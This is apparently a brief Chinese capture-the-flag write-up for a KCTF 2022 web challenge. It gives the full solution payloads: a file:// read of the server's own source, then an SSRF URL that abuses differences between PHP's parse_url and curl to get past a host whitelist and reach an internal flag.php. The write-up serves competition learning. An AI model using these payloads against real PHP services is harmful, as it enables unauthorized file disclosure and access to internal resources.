> 赛事：看雪2022 KCTF春季赛 2022 | 方向：web | 难度：medium | 工具：PHP

## 一句话总结

KCTF2022春Q4《飞蛾扑火》SSRF：parse_url与curl解析差异+123.57.254.42://127.0.0.1/../flag.php

## 攻击链

1. url.php?url=file://127.0.0.1/var/www/html/url.php读源码→发现curl_request+注释flag.php地址→phpinfo得知PHP 7.3.11→利用parse_url与curl解析差异→123.57.254.42://127.0.0.1/../flag.php构造SSRF打flag.php

## 关键 payload

```
file://127.0.0.1/var/www/html/url.php;parse_url vs curl解析差异;123.57.254.42://127.0.0.1/../flag.php;scheme=123.57.254.42 host=127.0.0.1 path=/../flag.php
```

## 经验教训

parse_url+curl组合的SSRF用scheme://host/path格式绕host白名单
